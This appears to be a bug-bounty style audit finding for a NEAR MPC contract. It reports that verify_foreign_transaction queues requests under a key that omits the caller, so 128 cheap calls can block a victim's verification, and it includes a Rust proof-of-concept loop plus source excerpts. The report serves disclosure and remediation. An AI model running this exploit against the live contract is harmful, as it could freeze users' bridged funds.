### Title
Caller-Agnostic `VerifyForeignTransactionRequest` Queue Key Enables Queue-Exhaustion DoS Against Legitimate Users - (File: `crates/contract/src/pending_requests.rs`)

---

### Summary

The `verify_foreign_transaction` endpoint queues requests under a key that contains no caller identity. Combined with the hard cap of `MAX_PENDING_REQUEST_FAN_OUT = 128` entries per key, any unprivileged account can exhaust the queue for a targeted foreign-transaction ID, causing every subsequent legitimate submission of that same request to fail with `PendingRequestQueueFull`. This is the direct analog of the external report's frontrunning/ID-collision class: in both cases a caller-agnostic identifier allows an adversary to occupy a shared slot before the legitimate user, blocking their request.

---

### Finding Description

**Root cause — caller-agnostic request key**

`args_into_verify_foreign_tx_request` converts the user-supplied arguments into a `VerifyForeignTransactionRequest` that contains only `{request, domain_id, payload_version}` — the caller's account ID is never included. [1](#0-0) 

The resulting struct is used verbatim as the map key in `pending_verify_foreign_tx_requests`: [2](#0-1) 

**Root cause — bounded fan-out queue**

`push_pending_yield` enforces a hard ceiling of `MAX_PENDING_REQUEST_FAN_OUT = 128`. Once the queue for a given key reaches 128 entries, any further call panics with `PendingRequestQueueFull`: [3](#0-2) 

**Attack path**

1. Attacker observes (or predicts) a target `{tx_id, domain_id, payload_version}` tuple — all fields are public on-chain data.
2. Attacker submits 128 `verify_foreign_transaction` calls with that exact tuple from a single account. Each call costs only 1 yoctoNEAR deposit plus negligible NEAR gas.
3. The queue for that key is now full.
4. The legitimate user submits the same request; `push_pending_yield` panics and the transaction reverts with `PendingRequestQueueFull`.
5. The attacker can repeat step 2 immediately after the MPC nodes drain the queue via `respond_verify_foreign_tx`, sustaining the DoS indefinitely.

The `verify_foreign_transaction` function performs no per-caller rate limiting: [4](#0-3) 

**Contrast with `sign`**

For `sign`, `SignatureRequest::new` folds the caller's `predecessor_id` into a `tweak`, making the queue key caller-specific. An attacker cannot fill another user's signing queue. [5](#0-4) 

`verify_foreign_transaction` has no equivalent binding — the test comment itself acknowledges the caller-agnostic design: [6](#0-5) 

---

### Impact Explanation

An attacker can persistently prevent any specific foreign-chain transaction from being verified by the MPC network. Because `verify_foreign_transaction` is the gateway for cross-chain bridge operations, blocking it can freeze user funds that are contingent on receiving a `VerifyForeignTransactionResponse` (e.g., a bridge contract waiting for proof of a deposit on Ethereum before releasing NEAR-side assets). This constitutes **request-lifecycle manipulation that breaks production safety/accounting invariants** — matching the allowed Medium impact tier.

---

### Likelihood Explanation

- The attack costs 128 × 1 yoctoNEAR + NEAR gas per cycle, which is negligible on NEAR/Base-equivalent L2 economics.
- The target `tx_id` is public on-chain data on the foreign chain and visible in the NEAR mempool before finality.
- No privileged access, TEE compromise, or threshold collusion is required — any NEAR account suffices.
- The attack can be sustained indefinitely by refilling the queue after each MPC drain.

---

### Recommendation

1. **Include the caller's account ID in the `VerifyForeignTransactionRequest` key** for the fan-out map, analogous to how `SignatureRequest` uses a caller-derived tweak. This makes each user's queue slot independent.
2. Alternatively, **enforce a per-account submission cap** inside `verify_foreign_transaction` (e.g., reject if the same `predecessor_id` already has an entry in the queue for this request key).
3. If the caller-agnostic fan-out is intentional (to share one MPC computation across many callers), consider a **separate per-caller yield map** that is resolved by the single shared MPC response, so filling the shared queue does not block new callers.

---

### Proof of Concept

```rust
// Attacker fills the queue for a target Bitcoin tx_id before the legitimate user.
let attacker_request = VerifyForeignTransactionRequestArgs {
    domain_id: foreign_tx_domain_id,
    payload_version: ForeignTxPayloadVersion::V1,
    request: ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
        tx_id: TARGET_TX_ID,          // same tx the victim wants to verify
        confirmations: 2.into(),
        extractors: vec![BitcoinExtractor::BlockHash],
    }),
};

// Attacker submits 128 identical calls (1 yoctoNEAR each) to exhaust the queue.
for _ in 0..128 {
    attacker_account
        .call(contract.id(), "verify_foreign_transaction")
        .args_json(json!({ "request": attacker_request }))
        .deposit(NearToken::from_yoctonear(1))
        .max_gas()
        .transact()
        .await?;
}

// Legitimate user's submission now fails.
let result = victim_account
    .call(contract.id(), "verify_foreign_transaction")
    .args_json(json!({ "request": attacker_request }))
    .deposit(NearToken::from_yoctonear(1))
    .max_gas()
    .transact()
    .await?
    .into_result();

assert!(result.unwrap_err().to_string().contains("Pending-request queue is full"));
// Victim's cross-chain operation is blocked; attacker repeats after each MPC drain.
```

pub const MAX_PENDING_REQUEST_FAN_OUT: u8 = 128;

/// Append a yield index to the pending-request fan-out queue for `request`.
///
/// Panics with `RequestError::PendingRequestQueueFull` if the resulting queue would
/// exceed `MAX_PENDING_REQUEST_FAN_OUT`.
pub(crate) fn push_pending_yield<K>(
    requests: &mut LookupMap<K, Vec<YieldIndex>>,
    request: K,
    data_id: CryptoHash,
) where
    K: BorshSerialize + BorshDeserialize + Clone + Ord,
{
    let queue = requests.entry(request).or_default();
    if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
        env::panic_str(
            &RequestError::PendingRequestQueueFull {
                limit: MAX_PENDING_REQUEST_FAN_OUT,
            }
            .to_string(),
        );
    }
    queue.push(YieldIndex { data_id });

    pub fn verify_foreign_transaction(&mut self, request: VerifyForeignTransactionRequestArgs) {
        log!(
            "verify_foreign_transaction: predecessor={:?}, request={:?}",
            env::predecessor_account_id(),
            request
        );

        self.check_request_preconditions(
            request.domain_id,
            DomainPurpose::ForeignTx,
            Gas::from_tgas(self.config.sign_call_gas_attachment_requirement_tera_gas),
            MINIMUM_SIGN_REQUEST_DEPOSIT,
        );

        let requested_chain = request.request.chain();
        let supported_chains = self.get_supported_foreign_chains();
        if !supported_chains.contains(&requested_chain) {
            env::panic_str(
                &InvalidParameters::ForeignChainNotSupported {
                    requested: requested_chain,
                }
                .to_string(),
            );
        }

        let callback_gas = Gas::from_tgas(
            self.config
                .return_signature_and_clean_state_on_success_call_tera_gas,
        );

        let request = args_into_verify_foreign_tx_request(request);
        let callback_args = serde_json::to_vec(&(&request,)).unwrap();
        self.enqueue_yield_request(
            method_names::RETURN_VERIFY_FOREIGN_TX_AND_CLEAN_STATE_ON_SUCCESS,
            callback_args,
            callback_gas,
            move |this, id| this.add_verify_foreign_tx_request(request, id),
        );
    }
